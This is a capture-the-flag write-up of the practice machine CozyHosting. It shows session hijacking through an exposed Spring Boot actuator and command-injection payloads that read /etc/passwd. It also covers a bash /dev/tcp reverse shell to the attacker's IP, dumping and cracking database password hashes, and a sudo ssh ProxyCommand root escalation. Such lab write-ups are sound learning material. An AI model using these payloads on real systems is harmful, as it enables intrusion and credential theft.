# CozyHosting

## Information Gathering

- On `http://cozyhosting.htb`, we have some contact information
```
South Jakarta City 12120, Jakarta, Indonesia

Phone: +62 5589 55488 55
Email: info@cozyhosting.htb
```


## Enumeration

Full nmap scan:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

### 22/tcp

### 80/tcp

Technologies:
- JS Template: FlexStart
- SpingBoot
    - **Version**
    - Resources
        - https://spring.io/projects
        - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators
        - https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
        - https://mihaita-tinta.medium.com/searching-for-vulnerabilities-in-a-spring-boot-application-bdbedb5440ba
        - https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators
        - https://www.hackthebox.com/blog/spring4shell-explained-cve-2022-22965

We are immediately redirected to http://cozyhosting.htb. Adding to /etc/hosts file

Running gobuster scan on root:
```
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/admin                (Status: 401) [Size: 97]
/logout               (Status: 204) [Size: 0]
/error                (Status: 500) [Size: 73]
```

Banner grabbing:
```bash
$ curl -I "http://cozyhosting.htb"
HTTP/1.1 200 
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 25 Sep 2023 22:33:43 GMT
Content-Type: text/html;charset=UTF-8
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Language: en-US
```

When navigating to a page which doesn't exist, we get a 404 and the following error:
```
Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.
Mon Sep 25 22:35:46 UTC 2023
There was an unexpected error (type=Not Found, status=404).
```
This indicates we are testinga SpringBoot framework

From `/admin`:
```
GET /admin HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=E483CAF672A36602F7305AF9761393EE
Upgrade-Insecure-Requests: 1

```
There is a JSESSIONID. Indicates this is a JSP servlet.

Running gobuster scan with `spring-boot.txt` wordlist:
```bash
$ gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -t 50 -o gob/cozyhosting-root-springboot.gob
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/spring-boot.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/25 18:50:29 Starting gobuster in directory enumeration mode
===============================================================
/actuator             (Status: 200) [Size: 634]
/actuator/env/path    (Status: 200) [Size: 487]
/actuator/env/home    (Status: 200) [Size: 487]
/actuator/env/lang    (Status: 200) [Size: 487]
/actuator/env         (Status: 200) [Size: 4957]
/actuator/sessions    (Status: 200) [Size: 148]
/actuator/health      (Status: 200) [Size: 15]
/actuator/beans       (Status: 200) [Size: 127224]
/actuator/mappings    (Status: 200) [Size: 9938]
```

The `/actuator/sessions` actuator reveals session information about other authenticated users:
```json
{
  "EF592116E313C3EE76A696CC4C04D4DB": "kanderson",
  "3BBB0C852B07D7F325FACF09AAB03978": "UNAUTHORIZED",
  "85EAE64ADF4DD4FFD7B7E4BD1BF388C5": "UNAUTHORIZED",
  "E8735D16809559854F63731D775B55EF": "kanderson",
  "37F0852DA0984996DA74442B4C029F88": "UNAUTHORIZED"
}
```

Authenticating, we have a POST form which executes the endpoint `/executessh` no success when running `nc -lnvp 22` and getting a connection back.


Submitting the following request:
```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://cozyhosting.htb
Connection: close
Cookie: JSESSIONID=E8735D16809559854F63731D775B55EF
Upgrade-Insecure-Requests: 1

host=10.10.14.25&username=kanderson;
```

Returns

```
HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 25 Sep 2023 23:19:29 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname kanderson: Temporary failure in name resolution/bin/bash: line 1: @10.10.14.25: command not found
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY


```

The error `/bin/bash: line 1: @10.10.14.25: command not found` indicates we have a potential OS command injeciton. However, inserting whitespaces does not work.


Sending
```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: http://cozyhosting.htb
Connection: close
Cookie: JSESSIONID=E8735D16809559854F63731D775B55EF
Upgrade-Insecure-Requests: 1

host=10.10.14.25&username=$(cat$IFS/etc/passwd)kanderson
```

Returns:
```
HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 25 Sep 2023 23:27:37 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname root:x:0:0:root:/root:/bin/bash: Name or service not known
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY


```

Where we can see the beginning of `/etc/passwd`

Sending:
```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://cozyhosting.htb
Connection: close
Cookie: JSESSIONID=E8735D16809559854F63731D775B55EF
Upgrade-Insecure-Requests: 1

host=10.10.14.25&username=$(ping%0910.10.14.25)kanderson
```

Where `%09` is the tab URL encoded character. This gets me a ping back


## Foothold

Sending the following payload while authenticated as `kanderson`:
```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://cozyhosting.htb
Connection: close
Cookie: JSESSIONID=E8735D16809559854F63731D775B55EF
Upgrade-Insecure-Requests: 1

host=10.10.14.25&username=$(bash%09-i%09>%26/dev/tcp/10.10.14.25/1337%090>%261)kanderson1
```

Gets me a reverse shell


## Privilege Escalation

Decompiling `/app/cloudhosting-0.0.1.jar` with `jadx`, found a `application.properties`

```
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

I use the [hacktricks/pentesting-postgresql](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql) cheatsheet

Use credentials to authenticate to postgresql server:
```bash
$ psql -h 127.0.0.1 -U postgres -W
Password: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# 
```

Enumerating databases and tables:
```bash
postgres=# \list
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

Lets look at `cozyhosting`:

```bash
postgres=# \c cozyhosting
cozyhosting=# \d
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)
```

Dump `users`

```bash
cozyhosting=# select * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

Tossing this hash into JtR:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt admin-hash.txt      
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
1g 0:00:00:03 DONE (2023-09-25 21:47) 0.2688g/s 774.1p/s 774.1c/s 774.1C/s onlyme..soccer9
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

This credential allows lateral movement to `josh`

Checking if `josh` can run any applications as root:

```bash
$ sudo -l 
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

Using [GTFO-Bins - SSH Sudo](https://gtfobins.github.io/gtfobins/ssh/#sudo) we get a root shell:

```bash
$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# id
uid=0(root) gid=0(root) groups=0(root)
```